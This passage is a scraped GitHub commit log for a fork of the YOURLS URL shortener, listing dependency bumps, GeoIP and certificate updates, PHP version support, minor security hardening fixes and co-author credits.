Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.11.0 to 2.12.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.11.0...2.12.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.12.0 to 2.13.0 (#3032)

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.12.0 to 2.13.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.12.0...2.13.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Bump peter-evans/create-pull-request from 3.10.0 to 3.10.1 (#3029)

Bumps [peter-evans/create-pull-request](https://github.com/peter-evans/create-pull-request) from 3.10.0 to 3.10.1.
- [Release notes](https://github.com/peter-evans/create-pull-request/releases)
- [Commits](https://github.com/peter-evans/create-pull-request/compare/v3.10.0...v3.10.1)

---
updated-dependencies:
- dependency-name: peter-evans/create-pull-request
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Minor security improvements (#3034)

* Prevent iframe jacking
* Enforce nonce on admin login screen

* Bump version and update changelog

[skip ci]

* Update auth tests to match #3034 (#3035)

* Minor security improvements #2 (#3041)

* Escape HTML and attributes before returning
* Remove deprecated vars

* Prevent encryption warning when password provided via env (#3040)

Fixes #3038

* added check for user provided from environment variables
* Add unit tests

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Support HTTPS termination on a reverse proxy (#3044)

When HTTPS termination happens on a reverse proxy, $_SERVER['HTTPS'] is not set and $_SERVER['SERVER_PORT'] is 80.
The current implementation tries to redirect infinitely in this situation because the function yourls_is_ssl() is false, although the actual URL begins with https://.

* Filterable user defined constants, and more tests (#3048)

* Test referrer parsing

* Update CHANGELOG.md

* Post release bump. Onto the next version!

[skip ci]

* Use PAT in workflow to allow chaining

* Sanitize user input in upgrade (#3055)

* Bump shivammathur/setup-php from 2.13.0 to 2.14.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.13.0 to 2.14.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.13.0...2.14.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Remove labeler as per template enforcement

* Enable auto-merge for dependabot

* Enable auto-merge for dependabot

* Bump shivammathur/setup-php from 2.14.0 to 2.15.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.14.0 to 2.15.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.14.0...2.15.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump actions/checkout from 2.3.4 to 2.3.5

Bumps [actions/checkout](https://github.com/actions/checkout) from 2.3.4 to 2.3.5.
- [Release notes](https://github.com/actions/checkout/releases)
- [Changelog](https://github.com/actions/checkout/blob/main/CHANGELOG.md)
- [Commits](https://github.com/actions/checkout/compare/v2.3.4...v2.3.5)

---
updated-dependencies:
- dependency-name: actions/checkout
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Remove explicit matrix tag in workflow name

Let GitHub auto tag jobs and make them more generic

* Fix incorrect \"prefix and shorten\" notice while logged out

Fixes #2688

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Automatic PR for Helm charts after a release

* Fix workflow file

[ci skip]

* Bump actions/checkout from 2.3.5 to 2.4.0

Bumps [actions/checkout](https://github.com/actions/checkout) from 2.3.5 to 2.4.0.
- [Release notes](https://github.com/actions/checkout/releases)
- [Changelog](https://github.com/actions/checkout/blob/main/CHANGELOG.md)
- [Commits](https://github.com/actions/checkout/compare/v2.3.5...v2.4.0)

---
updated-dependencies:
- dependency-name: actions/checkout
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump peter-evans/create-pull-request from 3.10.1 to 3.11.0

Bumps [peter-evans/create-pull-request](https://github.com/peter-evans/create-pull-request) from 3.10.1 to 3.11.0.
- [Release notes](https://github.com/peter-evans/create-pull-request/releases)
- [Commits](https://github.com/peter-evans/create-pull-request/compare/v3.10.1...v3.11.0)

---
updated-dependencies:
- dependency-name: peter-evans/create-pull-request
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump shivammathur/setup-php from 2.15.0 to 2.16.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.15.0 to 2.16.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.15.0...2.16.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump peter-evans/create-pull-request from 3.11.0 to 3.12.0

Bumps [peter-evans/create-pull-request](https://github.com/peter-evans/create-pull-request) from 3.11.0 to 3.12.0.
- [Release notes](https://github.com/peter-evans/create-pull-request/releases)
- [Commits](https://github.com/peter-evans/create-pull-request/compare/v3.11.0...v3.12.0)

---
updated-dependencies:
- dependency-name: peter-evans/create-pull-request
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Revert 3090 & fix tests (#3188)

* Allow prefix n shortening without being logged in

Fixes #3189

- Allow prefix n shortening without being logged in
- Test checking for redirection on successful auth

Props @dan-r for the initial digging on this issue !

* Update GeoIP db (#3191)

* Update GeoIP2 db
* Update tests

Fixes #3173

* Bump peter-evans/create-pull-request from 3.12.0 to 3.12.1

Bumps [peter-evans/create-pull-request](https://github.com/peter-evans/create-pull-request) from 3.12.0 to 3.12.1.
- [Release notes](https://github.com/peter-evans/create-pull-request/releases)
- [Commits](https://github.com/peter-evans/create-pull-request/compare/v3.12.0...v3.12.1)

---
updated-dependencies:
- dependency-name: peter-evans/create-pull-request
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump shivammathur/setup-php from 2.16.0 to 2.17.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.16.0 to 2.17.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.16.0...2.17.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Reuse org workflows

* Drop release workflows

The relative actions has been moved to downstream to simplify maintenance

* Updated default links from 'http' to 'https' (#3229)

* Updated default links from 'http' to 'https'
* Updated unit test

* Bump to php 8.1 and drop 7.2, 7.3 (#3230)

* Bump tests to php 8.1 and drop 7.2, 7.3
* Bump vendor version to align with new requirements
* Drop conflicted and deprecated YDB functions
* Use proper Request namespace
* Fix a deprecation warning

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update .gitattributes

* Clean up gitattributes

* Mark vendor files as generated

* Remove ozh/phpass and use on password_* functions (#3232)

Fixes #3231

* Bump shivammathur/setup-php from 2.17.0 to 2.17.1

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.17.0 to 2.17.1.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.17.0...2.17.1)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump actions/checkout from 2.4.0 to 3

Bumps [actions/checkout](https://github.com/actions/checkout) from 2.4.0 to 3.
- [Release notes](https://github.com/actions/checkout/releases)
- [Changelog](https://github.com/actions/checkout/blob/main/CHANGELOG.md)
- [Commits](https://github.com/actions/checkout/compare/v2.4.0...v3)

---
updated-dependencies:
- dependency-name: actions/checkout
  dependency-type: direct:production
  update-type: version-update:semver-major
...

Signed-off-by: dependabot[bot] <support@github.com>

* Upload coverage only when coverage is enabled

ref https://github.com/YOURLS/YOURLS/issues/3238

* Try and catch concurrency errors (#3233)

* Try and catch concurrency errors when creating new short urls, updating click count and logging redirects
* Code refactoring
* Couple more tests while at it

Fixes #2538
Fixes #765
Fixes #1974
Fixes #2829

* Remove scrutinizer (#3245)

* Make element ID independent from the short URL (#3244)

Fixing a dumb idea introduced in version 0.1 :^P

Fixes #2925

* Restore certificates (#3250)

* Restore certificates
* Make sure to test againts HTTPS so this won't happen again

* Explicitely exit after redirection where needed (#3257)

Fixes #3217
Would fix #2688 if it weren't already fixed

* Bump shivammathur/setup-php from 2.17.1 to 2.18.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.17.1 to 2.18.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.17.1...2.18.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Add nonce to the logout link (#3264)

* Add nonce to the logout link
* Add tests for cookies being set or reset
* More tests: check nonces are different for different actions & users

Fixes #3170

* More hooks for the admin view & search (#3265)

Will fix #3074 and #3262

* Plugin API : sandbox and uninstall procedure (#3258)

- foolproof (?) activation sandbox that actually works
- uninstall method
- Plugin activation sandbox and unit tests
- Uninstall script and tests

* Update version checking and use /version/1.1/ (#3268)

* Fix typo

[skip ci]

* Do not use md5() in yourls_salt() (#3278)

* Do not use md5() in yourls_salt()
* More tests while we're here

Fixes #3277

* Bump shivammathur/setup-php from 2.18.0 to 2.18.1

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.18.0 to 2.18.1.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.18.0...2.18.1)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* More plugin functions (#3281)

Introduce yourls_get_actions() and yourls_get_filters(), and their tests

* Update certificates (#3283)

Co-authored-by: ozh <ozh@ozh.org>

* Regularly update certificates (#3282)

Workflow to update cacert every monday if a new bundle is published

* Update GeoIP DB (#3289)

Co-authored-by: ozh <ozh@ozh.org>

* Regularly update GeoIP db (#3284)

Regularly update GeoIP db
Workflow to update geoip db every monday if a new version is available

* More checks with new version notices (#3290)

* add unit tests to make sure running 1.8.3-dev will trigger a new version notice when 1.8.3 is out (I think it already works this way)
* more validation of the api core/update response

* Promote docs.yourls.org (#3291)

* Don't delete branch when closing `update-geoip` PR (#3294)

* Update GeoIP with Github App (#3298)

* Update GeoIP with Github App
Source: https://github.com/peter-evans/create-pull-request/blob/main/docs/concepts-guidelines.md#authenticating-with-github-app-generated-tokens

Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>

* Update GeoIP DB (#3303)

Co-authored-by: ozh <ozh@ozh.org>

* More helpful \"URL already exists\" (#3305)

Fixes #1676 opened by... myself... 8 years ago ð

* 1.9 (#3304)

Co-authored-by: dgw <dgw@technobabbl.es>
Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>

* Post release bump

* Bump dependencies and remove (#3309)

Updates :
- aura/sql (3.0.0 => 3.1.0)
- maxmind/web-service-common (v0.8.1 => v0.9.0)
- rmccue/requests (v2.0.1 => 2.0.2)
- symfony/polyfill-intl-idn (v1.24.0 => v1.25.0)
- symfony/polyfill-intl-normalizer (v1.24.0 => v1.25.0)
- symfony/polyfill-mbstring (v1.24.0 => v1.25.0)
- symfony/polyfill-php72 (v1.24.0 => v1.25.0)

* Fix checking for new certs (#3313)

Stop fighthing with the etags, just download the darn files

* Update GeoIP DB (#3315)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update certificates (#3316)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Remove warnings on PHP 8.1 (#3317)

Also, minor code styles doc & typo
* Refactor yourls_filter_unique_id() to remove useless vars
* Comply with phpstan level 4
* add some tests to cover newly discovered potential issues

* Add missing inline documentation (#3325)

* Inline documentation (#3329)

Now 100% complete

* Fix error `Undefined constant \"intval\"` when upgrading (#3332)

Closes #3331

* Update GeoIP DB (#3334)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB (#3340)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* List required/suggested PHP extensions in composer.json (#3339)

* List required/suggested PHP extensions in composer.json

Best-effort attempt to declare all extensions used by YOURLS.

Based on the output of https://github.com/RogerGee/php-ext-depends

`composer check-platform-reqs` will show the status of all except those
in \"suggest\", which is a limitation to sort out later.

* Update composer.json extension requirements after further research

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update GeoIP DB (#3348)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* No hyphen in random keywords (#3353)

Fixes  #2281
Fixes YOURLS/random-keywords#8

* Always include `functions-(upgrade|install).php` (#3354)

Fixes #3326

* Return 400 instead of 500 when duplicate (#3355)

Fixes #3319

* Update GeoIP DB (#3356)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Release v1.9.1 (#3350)

* Version 1.9.1
Co-authored-by: dgw <dgw@technobabbl.es>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Post release bump

* Bump shivammathur/setup-php from 2.18.1 to 2.19.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.18.1 to 2.19.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.18.1...2.19.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump shivammathur/setup-php from 2.19.0 to 2.19.1

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.19.0 to 2.19.1.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.19.0...2.19.1)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP DB (#3362)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Fix geoip tests with a more confident ipv6 (#3369)

This one is in Japan according to all tools I could check

* Update GeoIP DB (#3368)

Co-authored-by: ozh <ozh@users.noreply.github.com>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update GeoIP DB (#3370)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.19.1 to 2.20.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.19.1 to 2.20.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.19.1...2.20.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump shivammathur/setup-php from 2.20.0 to 2.20.1

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.20.0 to 2.20.1.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.20.0...2.20.1)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP DB (#3373)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.20.1 to 2.21.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.20.1 to 2.21.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.20.1...2.21.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP DB (#3385)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.21.0 to 2.21.1

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.21.0 to 2.21.1.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.21.0...2.21.1)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update certificates (#3389)

Co-authored-by: ozh <ozh@users.noreply.github.com>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update GeoIP DB (#3397)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB (#3405)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.21.1 to 2.21.2

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.21.1 to 2.21.2.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.21.1...2.21.2)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP DB (#3417)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB (#3419)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB (#3424)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB (#3432)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* When adding URLs, new HTML rows should have unique HTML IDs. (#3431)

* When adding URLs, new HTML rows should have unique HTML IDs.
* Fix newly added assertions in Format_General::test_string2htmlid()

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Typofixes

* Update admin/index.php

Co-authored-by: dgw <dgw@technobabbl.es>

* Update GeoIP DB (#3436)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB

* Update certificates

* Bump shivammathur/setup-php from 2.21.2 to 2.22.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.21.2 to 2.22.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.21.2...2.22.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP DB (#3453)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Support PHP 8.2 (#3474)

* Update GeoIP DB

* Update GeoIP DB (#3477)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB (#3479)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.22.0 to 2.23.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.22.0 to 2.23.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.22.0...2.23.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump dependencies

  - Upgrading composer/ca-bundle (1.3.1 => 1.3.4)
  - Upgrading geoip2/geoip2 (v2.12.2 => v2.13.0)
  - Upgrading ozh/bookmarkletgen (1.2 => 1.2.2)
  - Upgrading pomo/pomo (v1.4.1 => v1.5.0)
  - Upgrading rmccue/requests (2.0.2 => v2.0.5)
  - Upgrading spatie/array-to-xml (2.16.0 => 2.17.1)
  - Upgrading symfony/polyfill-intl-idn (v1.25.0 => v1.27.0)
  - Upgrading symfony/polyfill-intl-normalizer (v1.25.0 => v1.27.0)
  - Upgrading symfony/polyfill-mbstring (v1.25.0 => v1.27.0)
  - Upgrading symfony/polyfill-php72 (v1.25.0 => v1.27.0)

* Update certificates

* Update GeoIP DB (#3488)

Co-authored-by: ozh <ozh@users.noreply.github.com>
Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>

* Bump shivammathur/setup-php from 2.23.0 to 2.24.0

Bumps [shivammathur/setup-php](https://github.com/shivammathur/setup-php) from 2.23.0 to 2.24.0.
- [Release notes](https://github.com/shivammathur/setup-php/releases)
- [Commits](https://github.com/shivammathur/setup-php/compare/2.23.0...2.24.0)

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP workflow; set-output is deprecated

* Update cert workflow: set-output is deprecated

* Use the correct version 9 of PHPUnit

* Improve Actions name readability

* Update GeoIP DB (#3499)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Support usernames containing brackets (#3365)

* wrapped $user in preg_quote function
* updated auth test for special character in username

Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Use sandbox for all included files (#3478)

- updated calls to functions
- deprecate function yourls_activate_plugin_sandbox()
- add unit tests
- log loaded files
- tweak yourls_debug_log to allow early uses

Co-authored-by: e-ht <1045813+e-ht@users.noreply.github>
Co-authored-by: eht <1045813+e-ht@users.noreply.github.com>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

Closes #3321

* Fix bug where editing a URL will update the first entry in the table (#3485)

Pass id to yourls_table_edit_row() so the correct line in the table is updated.
Fixes #3485

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Remove cookies from $_REQUEST (#3516)

Closes #3383
Closes #3351

* Make Googlebot indexing filterable (#3517)

Closes #3486

* Fix click threshold in admin view (#3518)

Fixes #3460

* Update GeoIP DB (#3519)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB (#3526)

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Comment what \"cache\" means here

[skip ci]

* Fixes bookmarklets with URL containing special chars (#3527)

Fixes #3523

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update CHANGELOG

[skip ci]

* Fix typo in comment (#3535)

* Bump version for 1.9.2 (#3537)

* Bump version

[skip ci]

* sync to upstream/master

---------

Signed-off-by: Aaron <admin@datahoarder.dev>
Signed-off-by: dependabot[bot] <support@github.com>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>
Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>
Co-authored-by: Darrell Agee <dagee3@users.noreply.github.com>
Co-authored-by: Marcus <MarcProe@users.noreply.github.com>
Co-authored-by: Liu Yue <hangxingliu@gmail.com>
Co-authored-by: Artur Weigandt <Art4@users.noreply.github.com>
Co-authored-by: Philip Colmer <pcolmer@users.noreply.github.com>
Co-authored-by: Lukas MÃ¼ller <info@muellerlukas.de>
Co-authored-by: Audrey Maniez <amaniez@access42.net>
Co-authored-by: paulgoodchild <paulgoodchild@users.noreply.github.com>
Co-authored-by: Michael Bemmerl <mail@mx-server.de>
Co-authored-by: JÃ©rÃ©my K <JeremyKeusters@users.noreply.github.com>
Co-authored-by: hdkjjsk612 <47492172+hdkjjsk612@users.noreply.github.com>
Co-authored-by: Ingo Kleiber <ikleiber@gmail.com>
Co-authored-by: ueickmann <45387393+ueickmann@users.noreply.github.com>
Co-authored-by: Aaryan Porwal <54525904+aaryanporwal@users.noreply.github.com>
Co-authored-by: Hitesh Jethva <hitjethva@gmail.com>
Co-authored-by: dgw <dgw@technobabbl.es>
Co-authored-by: Florian Latifi <mail@florian-latifi.at>
Co-authored-by: The Zach <zach2825@users.noreply.github.com>
Co-authored-by: Leo Viezens <leo.viezens@web.de>
Co-authored-by: Bibo-Joshi <hinrich.mahler@freenet.de>
Co-authored-by: Dan Benton <dan@dogsbody.com>
Co-authored-by: Aaron <admin@datahoarder.dev>
Co-authored-by: simon-eller <63782380+simon-eller@users.noreply.github.com>
Co-authored-by: LinuxStans <78315004+LinuxStans@users.noreply.github.com>
Co-authored-by: Jay Holtslander <j.holtslander@gmail.com>
Co-authored-by: Karsten Hoffmeyer <mediawiki@kghoffmeyer.de>
Co-authored-by: Jonathan Dahan <55917666+jonathandhn@users.noreply.github.com>
Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>
Co-authored-by: Jens Spanier <42373861+Virinum@users.noreply.github.com>
Co-authored-by: David Faber <dcfaber@gmail.com>
Co-authored-by: Peter Gasser <github@boedah.de>
Co-authored-by: Bryan Joshua Pedini <b.pedini@bjphoster.com>
Co-authored-by: Kaito Udagawa <umireon@gmail.com>
Co-authored-by: Dan Raper <djr2468@gmail.com>
Co-authored-by: jaas666 <30204147+jaas666@users.noreply.github.com>
Co-authored-by: github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>
Co-authored-by: yourls-bot[bot] <104057305+yourls-bot[bot]@users.noreply.github.com>
Co-authored-by: ozh <ozh@users.noreply.github.com>
Co-authored-by: Barry Hughes <3594411+barryhughes@users.noreply.github.com>
Co-authored-by: JT Smith <nexxai@gmail.com>
Co-authored-by: SXN31 <43016545+SXN31@users.noreply.github.com>
Co-authored-by: jarebear6expepjozn6rakjq5iczi3irqwphcvbswgkahd6b6twnxxid <1045813+jarebear6expepjozn6rakjq5iczi3irqwphcvb@users.noreply.github.com>
Co-authored-by: 4BRobby <robby@4bytes.de>
Co-authored-by: firfin <marck@wickedfruit.com>
Co-authored-by: Rodney Stromlund <Rodney.Stromlund@wnco.com>")[#2](https://github.com/iWantToKeepAnon/YOURLS/pull/2)[)](/iWantToKeepAnon/YOURLS/commit/801382d30b0232118703e19316c429ae02d43f81 "Php81 update (#2)

* deprecate Twitter :-(

See #2639 and https://git.io/Jvhw6 for more info

* Remove obsolete setting and link to wiki

[skip ci] [skip travis] [skip scrutinizer]

* Accept timestamped signature with arbitrary hash (#2644)

* Allow arbitrary hashed signatures
* Force timestamps to int
* Improve comment
* Test new feature and add more tests

* Truncate display of long IP

Ozh doing CSS. Yeah right. Fixes #2266

[skip travis] [skip ci] [skip scrutinizer]

* deprecate twitter (continued)

[skip travis] [skip scrutinizer] [skip ci]

* Update CHANGELOG.md

* Use SVG logo in lieu of the old PNG one (#2649)

Ahah. I love this expression, \"in lieu of\" :)
Also, remove those social buttons. I think they're useless and ugly.

* Update share links.

Closes #2554. [skip travis] [skip scrutinizer]

* Move /pages into /user (#2648)

Closes #1582

* Move `pages/` into `user/`
* Update functions to display pages
* Add tests for pages
* Update .gitignore and robots sample file

Co-authored-by:  LÃ©o Colombaro <git@colombaro.fr>

* Update contributors

I sometimes close pull requests yet use parts of the suggested code. In the
end it's a shame that original submitters are not given credit, so this
commit is just a sincere \"thank you\" to:
- @dagee3 for #2362
- @MarcProe for #2445
- @hangxingliu for #2545
- @Art4 for #2581
- @pcolmer / @philip-linaro for #2608
- @muellerlukas for #2554

Co-authored-by: Darrell Agee <dagee3@users.noreply.github.com>
Co-authored-by: Marcus <MarcProe@users.noreply.github.com>
Co-authored-by: Liu Yue <hangxingliu@gmail.com>
Co-authored-by: Artur Weigandt <Art4@users.noreply.github.com>
Co-authored-by: Philip Colmer <pcolmer@users.noreply.github.com>
Co-authored-by: Lukas MÃ¼ller <info@muellerlukas.de>

(hoping they'll show in the contributors list)

* Update contributors

I sometimes close pull requests yet use parts of the suggested code. In the
end it's a shame that original submitters are not given credit, so this
commit is just a sincere \"thank you\" to:
- @dagee3 for #2362
- @MarcProe for #2445
- @hangxingliu for #2545
- @Art4 for #2581
- @pcolmer / @philip-linaro for #2608
- @muellerlukas for #2554

(hoping they'll show in the contributors list)
[skip scrutinizer] [skip travis]

Co-authored-by: Darrell Agee <dagee3@users.noreply.github.com>
Co-authored-by: Marcus <MarcProe@users.noreply.github.com>
Co-authored-by: Liu Yue <hangxingliu@gmail.com>
Co-authored-by: Artur Weigandt <Art4@users.noreply.github.com>
Co-authored-by: Philip Colmer <pcolmer@users.noreply.github.com>
Co-authored-by: Lukas MÃ¼ller <info@muellerlukas.de>

* Add labels to every input on index page (#2650)

Props @audreymaniez
Closes #2300

Co-authored-by: Audrey Maniez <amaniez@access42.net>

* Always return trimmed (and filtered) YOURLS_SITE (#2653)

Closes #2651

* Reorganize .gitignore for readability

It was either too forgiving or too ignoring
[skip scrutinizer] [skip travis]

* Add missing translations (#2655)

Fixes #1666
Fixes #1598
